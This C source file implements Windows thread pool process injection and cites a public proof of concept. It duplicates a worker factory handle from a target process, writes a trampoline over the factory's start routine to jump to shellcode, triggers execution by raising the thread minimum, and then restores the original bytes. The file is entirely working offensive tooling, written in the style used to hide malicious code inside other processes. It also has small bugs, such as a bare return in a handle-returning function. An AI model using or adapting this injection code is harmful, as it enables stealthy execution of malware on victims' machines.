#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include "common.h"

extern NT_API g_nt;

// https://github.com/Uri3n/Thread-Pool-Injection-PoC/blob/main/ThreadPoolInjection/Main.cpp#L30

HANDLE HijackProcessHandle(LPCWSTR objectType, HANDLE hProcess, DWORD desiredAccess) {

    NTSTATUS STATUS = 0x00;
    DWORD handleCount = NULL;
    ULONG handleInfoLength = NULL;
    HANDLE hDuplicatedHandle = NULL;
    ULONG objectTypeReturnLen = NULL;

    PPROCESS_HANDLE_SNAPSHOT_INFORMATION procHandleSnapshotInfo = NULL;
    PPUBLIC_OBJECT_TYPE_INFORMATION      objectInfo = NULL;

    if (!GetProcessHandleCount(hProcess, &handleCount)) {
        printf("[!] GetProcessHandleCount failed with error : %d\n", GetLastError());
        return;
    }

    handleInfoLength = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + (handleCount * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));

    procHandleSnapshotInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoLength));

    STATUS = g_nt.pNtQueryInformationProcess(hProcess, ProcessHandleInformation, procHandleSnapshotInfo, handleInfoLength, NULL);
    if (STATUS != 0x00) {
        printf("[!] NtQueryObject failed with error : 0x%0.8X\n", STATUS);
        return NULL;
    }

    for (size_t i = 0; i < procHandleSnapshotInfo->NumberOfHandles; i++) {

        if (!DuplicateHandle(hProcess, procHandleSnapshotInfo->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedHandle, desiredAccess, FALSE, NULL)) {
            continue;
        }

        // Get size first
        g_nt.pNtQueryObject(hDuplicatedHandle, ObjectTypeInformation, NULL, NULL, (PULONG)&objectTypeReturnLen);

        objectInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen));
      
        STATUS = g_nt.pNtQueryObject(hDuplicatedHandle, ObjectTypeInformation, objectInfo, objectTypeReturnLen, NULL);
        if (STATUS != 0x00) {
            printf("[!] NtQueryObject failed with error : 0x%0.8X\n", STATUS);
            break;
        }

        if (wcscmp(objectType, objectInfo->TypeName.Buffer) == 0) {
            break;
        }

        HeapFree(GetProcessHeap(), 0, objectInfo);
    }

    if (procHandleSnapshotInfo) {
        HeapFree(GetProcessHeap(), 0, procHandleSnapshotInfo);
    }

    if (objectInfo) {
        HeapFree(GetProcessHeap(), 0, objectInfo);
    }
    
    return hDuplicatedHandle;
}

// https://github.com/Uri3n/Thread-Pool-Injection-PoC/blob/main/ThreadPoolInjection/WorkInject.cpp

BOOL InjectStartRoutine(HANDLE hProcess, HANDLE hDuplicatedHandle, PVOID shellcodeAddress) {

    NTSTATUS STATUS = 0x00;
    WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
    DWORD oldProtect = NULL;
    DWORD threadMinCount = NULL;
    SIZE_T numBytesWritten = NULL;
    SIZE_T numBytesRead = NULL;

    uint8_t trampoline[] = {
       0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0x41, 0xFF, 0xE2
    };

    uint64_t patch = (uint64_t)(shellcodeAddress);
    memcpy(&trampoline[2], &patch, sizeof(patch));

    SIZE_T sizeToWrite = sizeof(trampoline);
    SIZE_T sizeToProtect = sizeToWrite;

    STATUS = g_nt.pNtQueryInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL);
    if (STATUS != 0x00) {
        printf("[!] NtQueryInformationWorkerFactory failed with error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    printf("[+] Got worker factory basic information\n `---> Address of start routine : 0x%p\n", workerFactoryInfo.StartRoutine);

    PVOID protect = workerFactoryInfo.StartRoutine;
    STATUS = g_nt.pNtProtectVirtualMemory(hProcess, &protect, &sizeToProtect, PAGE_READWRITE, &oldProtect);
    if (STATUS != 0x00) {
        printf("[!] NtProtectVirtualMemory [RW] failed with error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    // read the orginial bytes, we will write tham back after we write our trampoline and the payload executes
    PBYTE buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeToWrite);

    STATUS = g_nt.pNtReadVirtualMemory(hProcess, workerFactoryInfo.StartRoutine, buffer, sizeToWrite, &numBytesRead);
    if(STATUS != 0x00 && numBytesRead != sizeToWrite){
        printf("[!] NtReadVirtualMemory failed with error : 0x%0.8X\n \t `---> numBytesRead : %zu | sizeToWrite : %zu\n", STATUS, numBytesRead, sizeToWrite);
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    // write the trampoline
    STATUS = g_nt.pNtWriteVirtualMemory(hProcess, workerFactoryInfo.StartRoutine, trampoline, sizeToWrite, &numBytesWritten);
    if(STATUS != 0x00 && numBytesWritten != sizeToWrite){
        printf("[!] NtWriteVirtualMemory 1 failed with error : 0x%0.8X\n \t `---> numBytesWritten : %zu | sizeToWrite : %zu\n", STATUS, numBytesWritten, sizeToWrite);
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    printf("[+] Wrote trampoline to address of of start routine\n");
    
    // back to RX
    STATUS = g_nt.pNtProtectVirtualMemory(hProcess, &protect, &sizeToProtect, oldProtect, &oldProtect);
    if (STATUS != 0x00) {
        printf("[!] NtProtectVirtualMemory [RX] failed with error : 0x%0.8X\n", STATUS);
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    threadMinCount = workerFactoryInfo.TotalWorkerCount + 1;

    if ((STATUS = g_nt.pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryThreadMinimum, &threadMinCount, sizeof(uint32_t))) != 0x00) {
        printf("[!] NtSetInformationWorkerFactory fialed with error : 0x%0.8X\n", STATUS);
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    printf("[+] Executed payload\n");
    
    // sleep so payload can execute before we restore the StartRoutine bytes
    printf("[i] Sleeping before restoring bytes\n");
    Sleep(500);

    STATUS = g_nt.pNtProtectVirtualMemory(hProcess, &protect, &sizeToProtect, PAGE_READWRITE, &oldProtect);
    if (STATUS != 0x00) {
        printf("[!] NtProtectVirtualMemory [RW] failed with error : 0x%0.8X\n", STATUS);
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    STATUS = g_nt.pNtWriteVirtualMemory(hProcess, workerFactoryInfo.StartRoutine, buffer, sizeToWrite, &numBytesWritten);
    if(STATUS != 0x00 && numBytesWritten != sizeToWrite){
        printf("[!] NtWriteVirtualMemory 2 failed with error : 0x%0.8X\n \t `---> numBytesWritten : %zu | numBytesRead : %zu\n", STATUS, numBytesWritten, numBytesRead);
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    // back to RX again
    STATUS = g_nt.pNtProtectVirtualMemory(hProcess, &protect, &sizeToProtect, oldProtect, &oldProtect);
    if (STATUS != 0x00) {
        printf("[!] NtProtectVirtualMemory [RX] failed with error : 0x%0.8X\n", STATUS);
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    printf("[+] StartRoutine restored\n");
    HeapFree(GetProcessHeap(), 0, buffer);

    return TRUE;
}
